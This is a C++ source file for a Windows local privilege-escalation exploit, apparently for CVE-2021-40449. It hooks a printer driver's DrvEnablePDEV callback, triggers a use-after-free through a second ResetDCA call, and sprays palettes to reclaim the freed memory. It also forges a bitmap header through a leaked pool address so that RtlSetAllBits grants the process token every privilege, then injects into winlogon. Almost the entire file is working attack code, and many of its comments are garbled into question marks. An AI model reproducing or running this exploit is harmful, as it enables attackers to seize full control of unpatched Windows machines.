#include"command.h"
#include <cstdio>
#include <iostream>
#include <intrin.h>
#include <string.h> 



HMODULE g_ntdllModule = NULL;
DWORD64 g_kernelBaseAddr = 0;
DWORD64 g_tokenKernelAddress = 0;
DWORD64 g_fakeRtlBitMapAddr = 0;
DWORD64 g_rtlSetAllBitsAddr = 0;

DRVFN g_driverHooks[] = {
	{INDEX_DrvEnablePDEV, (PFN)hook_DrvEnablePDEV},
};
VoidFunc_t g_origDrvFuncs[INDEX_LAST];
char g_szPrinterName[MAX_PATH] = { 0 };
BOOL g_shouldTrigger = FALSE;
HDC g_hdc = NULL;
NtSetInformationThread_t g_SetInformationThread =  NULL;
NtQuerySystemInformation_t g_QuerySystemInformation = NULL;


DWORD64 CreateForgedBitMapHeader(DWORD64 token)
{
    /* ????????д??????α????λ?????????????RtlSetAllBits??????á? */
    /*
        ????????Big Pool?????????????????????????????????????
        ??????????????У?????????????????λ?????????? RTL_BITMAP??
        ?????? SystemBigPoolInformation ???????????????? Tag ????????
        ?????????????????????????????????????λ?????????????????????????λ??????????á?
    */
    // Cool trick taken from:
    // https://github.com/KaLendsi/CVE-2021-40449-Exploit/blob/main/CVE-2021-40449-x64.cpp#L448
    // https://gist.github.com/hugsy/d89c6ee771a4decfdf4f088998d60d19

    DWORD dwBufSize, dwOutSize, dwThreadID, dwExpectedSize;
    HANDLE hThread;
    USHORT dwSize;
    LPVOID lpMessageToStore, pBuffer;
    UNICODE_STRING target;
    HRESULT hRes;
    ULONG_PTR StartAddress, EndAddress, ptr;
    PBIG_POOL_INFO info;
    // CREATE_SUSPENDED ????????????? dwThreadID
    hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)NULL, 0, CREATE_SUSPENDED, &dwThreadID);

    dwSize = 0x1000;

    lpMessageToStore = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);

    memset(lpMessageToStore, 0x41, 0x20);

    // BitMapHeader->SizeOfBitMap
    *(DWORD64*)lpMessageToStore = 0x80;

    // BitMapHeader->Buffer
    *(DWORD64*)((DWORD64)lpMessageToStore + 8) = token;

    target = {};

    target.Length = dwSize;
    target.MaximumLength = 0xffff;
    target.Buffer = (PWSTR)lpMessageToStore;

    // ???? ThNm
    // ????????????? PoolTag="ThNm" ???С? sizeof(UNICODE_STRING) + target.Length ?????
    hRes = g_SetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &target, 0x10);

    dwBufSize = 1024 * 1024;
    pBuffer = LocalAlloc(LPTR, dwBufSize); // ????з?????????????
    /* ?????????д???????б? */
    hRes = g_QuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, pBuffer, dwBufSize, &dwOutSize);
    /*
        QuerySystemInformation ???????б?
        ???????????????С??PoolTag????? NonPaged ???
    */
    dwExpectedSize = target.Length + sizeof(UNICODE_STRING);
    /*
        ?????8???? count BIG_POOL_INFO
    */
    StartAddress = (ULONG_PTR)pBuffer;
    EndAddress = StartAddress + 8 + *((PDWORD)StartAddress) * sizeof(BIG_POOL_INFO);
    ptr = StartAddress + 8;
    while (ptr < EndAddress)
    {
        info = (PBIG_POOL_INFO)ptr;

        if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
        {
            return (((ULONG_PTR)info->Address) & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
        }
        ptr += sizeof(BIG_POOL_INFO);
    }

    loge("Failed to leak pool address for forged BitMapHeader");

    return NULL;
}

int SetupUsermodeCallbackHook()
{
	DWORD flags = PRINTER_ENUM_LOCAL | PRINTER_ENUM_CONNECTIONS;
	PRINTER_INFO_2A	*pPrinterEnum, *printerInfo;
	DrvEnableDriver_t DrvEnableDriver = NULL;
	DRVENABLEDATA drvEnableData = { 0 };
	VoidFunc_t DrvDisableDriver = NULL;
	PDRIVER_INFO_2A pDriverInfo = NULL;
	DWORD needed, returned,dwProtect;
	HANDLE hPrinter = NULL;
	HMODULE hModule = NULL;
	BOOL success = FALSE;
	BYTE* buffer = NULL;
	
	int retval = 0;


	pPrinterEnum = printerInfo = NULL;
	returned = needed = dwProtect = 0;
	
	EnumPrintersA(flags,NULL,2,NULL,0,&needed,&returned);
	if (!needed) {
		loge("[!] No printers found or EnumPrintersA failed");
		goto error;
	}
	buffer = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
	if (!buffer) {
		loge("[!] HeapAlloc failed");
		goto error;
	}
	if (!EnumPrintersA(flags,NULL,2,buffer,needed,&needed,&returned))
	{
		loge("[!] EnumPrintersW failed: %lu\n", GetLastError());
		goto error;
	}
	pPrinterEnum = (PRINTER_INFO_2A*)buffer;
	logu("=== Printers: %lu ===", returned);

	for (size_t i = 0; i < returned; i++)
	{
		printerInfo = &pPrinterEnum[i];
		hModule = NULL;
        strcpy_s(g_szPrinterName, MAX_PATH, printerInfo->pPrinterName);
		printf("[Printer %lu] Name: %s\n",i, printerInfo->pPrinterName);
		
		if (!OpenPrinterA(printerInfo->pPrinterName, &hPrinter, NULL)) {
			logw("Open Failed");
			continue;
		}
		needed = 0;
		GetPrinterDriverA(hPrinter, NULL, 2, NULL, 0, &needed);
		if (!needed) {
			logw("GetPrinterDriverA Failed");
			continue;
		}
		pDriverInfo = (PDRIVER_INFO_2A)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
		if (!GetPrinterDriverA(hPrinter, NULL, 2, (LPBYTE)pDriverInfo, needed, &needed)) {
			logw("GetPrinterDriverA Failed");
			continue;
		}
		/*
			C:\WINDOWS\System32\DriverStore\FileRepository\ntprint.inf_amd64_20ea026aadec8898\Amd64\mxdwdrv.dll
			???? DLL
		*/
		logi("Driver DLL: %s\n", pDriverInfo->pDriverPath);
		hModule = LoadLibraryExA(pDriverInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);
		if (!hModule) {
			logw("LoadLibraryExA Failed");
			continue;
		}
		DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(hModule, "DrvEnableDriver");
		DrvDisableDriver = (VoidFunc_t)GetProcAddress(hModule, "DrvDisableDriver");
		if (DrvEnableDriver == NULL || DrvDisableDriver == NULL)
		{
			logw("Failed to get exported functions from driver");
			continue;
		}
		// ??????????
		logu("Get DrvEnableDriver");
		if (!DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &drvEnableData)) {
			logw("Failed to get DrvEnableDriver");
			continue;
		}
		success = VirtualProtect(drvEnableData.pdrvfn, sizeof(PFN) * drvEnableData.c, PAGE_READWRITE, &dwProtect);
		if (!success) {
			logw("VirtualProtect Failed");
			continue;
		}

		for (DWORD i = 0; i < sizeof(g_driverHooks) / sizeof(DRVFN); i++)
		{
			// ???????????????????????
			for (DWORD n = 0; n < drvEnableData.c; n++)
			{
				ULONG iFunc = drvEnableData.pdrvfn[n].iFunc;

				// ??? Index
				if (g_driverHooks[i].iFunc == iFunc)
				{
					// ????????????,?????
					logi("Hijack function %d / iFunc %d", n, iFunc);
					g_origDrvFuncs[iFunc] = (VoidFunc_t)drvEnableData.pdrvfn[n].pfn;
					drvEnableData.pdrvfn[n].pfn = g_driverHooks[i].pfn;
					break;
				}
			}
		}
		// 
		DrvDisableDriver();
		// ????????
		VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), dwProtect, &dwProtect);
		break;
	}

	retval = 1;
error:
	if (buffer) {
		HeapFree(GetProcessHeap(), 0, buffer);
	}
	return retval;
}

int setup() {
    HMODULE kernelModule = NULL;
    DWORD64 rtlSetAllBitsOffset = 0;
    // ???α?? bitmap
	g_ntdllModule = GetModuleHandleA("ntdll.dll");
	if (!g_ntdllModule) {
		loge("GetModuleHandleA ntdll failed");
		return 0;
	}
    g_SetInformationThread = (NtSetInformationThread_t)GetProcAddress(g_ntdllModule, "NtSetInformationThread");
    g_QuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(g_ntdllModule, "NtQuerySystemInformation");
    if (!g_SetInformationThread || !g_QuerySystemInformation) {
        loge("Get NtSetInformationThread_t NtQuerySystemInformation_t failed");
        return 0;
    }
    g_tokenKernelAddress = GetProcessTokenAddress(GetCurrentProcessId());
    showAddr(g_tokenKernelAddress);
    if (!g_tokenKernelAddress) {
        loge("GetProcessTokenAddress failed");
        return 0;
    }
    g_fakeRtlBitMapAddr = CreateForgedBitMapHeader(g_tokenKernelAddress+0x40);
    showAddr(g_fakeRtlBitMapAddr);
    if (!g_fakeRtlBitMapAddr) {
        loge("CreateForgedBitMapHeader failed");
        return 0;
    }
    // ??? rtlSetAllBits ???
    g_kernelBaseAddr = GetKernelBase();
    if (!g_kernelBaseAddr) {
        loge("GetKernelBase failed");
        return 0;
    }
    kernelModule = LoadLibraryExW(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (!kernelModule) {
        loge("LoadLibraryExW ntoskrnl failed");
        return 0;
    }
    rtlSetAllBitsOffset = (DWORD64)GetProcAddress(kernelModule, "RtlSetAllBits");
    g_rtlSetAllBitsAddr = (DWORD64)g_kernelBaseAddr + rtlSetAllBitsOffset - (DWORD64)kernelModule;
    showAddr(g_rtlSetAllBitsAddr);
    if (!g_rtlSetAllBitsAddr) {
        loge("Failed to pool leak address of token");
        return 0;
    }
	return SetupUsermodeCallbackHook();
}

VOID SprayPalettes(DWORD size)
{
	/* Spray palettes to reclaim freed memory */
	// 0x90 ???С /4 ???
	DWORD palCount = (size - 0x90) / 4;
	DWORD palSize = sizeof(LOGPALETTE) + (palCount - 1) * sizeof(PALETTEENTRY);
	LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palSize);

	if (lPalette == NULL) {
		loge("Failed to create palette");
		return;
	}

	DWORD64* p = (DWORD64*)lPalette->palPalEntry;

	/*
		??????????????
			???? RtlSetAllBits(BitMapHeader) ??????
			???? BitMapHeader ?????α??????
			???????????????????? `CreateForgedBitMapHeader` ??????
			?????????????
	*/

	// ???????汾??????????????????????
	// Arg1 (BitMapHeader)
	for (DWORD i = 0; i < 0x120; i++) {
        p[i] = g_fakeRtlBitMapAddr;
		// p[0xe5] = globals::fakeRtlBitMapAddr;
		// 0xe1
	}

	// Function pointer (RtlSetAllBits)
	for (DWORD i = 0x120; i < (palSize - 4) / 8; i++) {
        p[i] = g_rtlSetAllBitsAddr;
		// p[0x15b] = globals::rtlSetAllBits;
		// 0x157
	}


	lPalette->palNumEntries = (WORD)palCount;
	lPalette->palVersion = 0x300;

	// Create lots of palettes
	for (DWORD i = 0; i < 0x5000; i++)
	{
		CreatePalette(lPalette);
	}
}



int main(void) {
	setup();

	g_hdc = CreateDCA(NULL, g_szPrinterName, NULL, NULL);
	if (!g_hdc) {
		loge("CreateDCA Failed");
		goto error;
	}
    // UAF
	g_shouldTrigger = TRUE;
	ResetDCA(g_hdc, NULL);
    if (!InjectToWinlogon()) {
        loge("InjectToWinlogon Failed");
    }
error:
	system("pause");
	return 0;
}


extern "C"
DHPDEV hook_DrvEnablePDEV(
	DEVMODEW* pdm,
	LPWSTR pwszLogAddress,
	ULONG cPat,
	HSURF* phsurfPatterns,
	ULONG cjCaps,
	ULONG* pdevcaps,
	ULONG cjDevInfo,
	DEVINFO* pdi,
	HDEV hdev,
	LPWSTR pwszDeviceName,
	HANDLE hDriver
)
{
	HDC tmp_hdc = NULL;
	DHPDEV res = NULL;
	
	logu("Hooked DrvEnablePDEV called");
	// HOOK DrvEnablePDEV
	res = ((DrvEnablePDEV_t)g_origDrvFuncs[INDEX_DrvEnablePDEV])(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);
    if (g_shouldTrigger) {
		// UAF
		g_shouldTrigger = FALSE;
		logu("Triggering UAF with second ResetDC");
		tmp_hdc = ResetDCA(g_hdc, NULL); // 二次 ResetDC
		// 通过 g_hdc 释放 ppdev 等资源，并且 handle 不变
		logu("Spraying palettes");
		SprayPalettes(0xe20);

		logu("Done spraying palettes");
	}
	return res;
}